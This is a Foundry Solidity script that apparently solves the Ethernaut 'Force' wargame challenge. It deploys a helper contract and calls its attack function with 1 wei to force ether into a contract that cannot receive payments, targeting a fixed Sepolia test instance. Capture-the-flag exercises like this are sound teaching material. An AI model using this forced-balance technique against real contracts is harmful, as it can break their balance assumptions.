// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "lib/forge-std/src/Script.sol";
import {Force, Bienfaiteur} from "../src/Force.sol";
import "../src/Force.sol";

contract ForceSolution is Script {
    Force public force;
    Bienfaiteur public bienfaiteur;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Solving Force...");
        if (block.chainid == 11155111) {
            force = Force(0x3977224B37411ab2b82311CBa85d1f95663d3457);
            bienfaiteur = new Bienfaiteur();
        } else {
            vm.deal(vm.envAddress("WALLET_ADDRESS"), 1 ether);
            force = new Force();
            bienfaiteur = new Bienfaiteur();
        }

        console.log("Old balance: ", address(force).balance);
        console.log("Old balance: ", address(bienfaiteur));

        bienfaiteur.attack{value: 1 wei}(payable(address(force)));
        console.log("New balance: ", address(force).balance);
        vm.stopBroadcast();
        console.log("Force Solved!");
    }
}
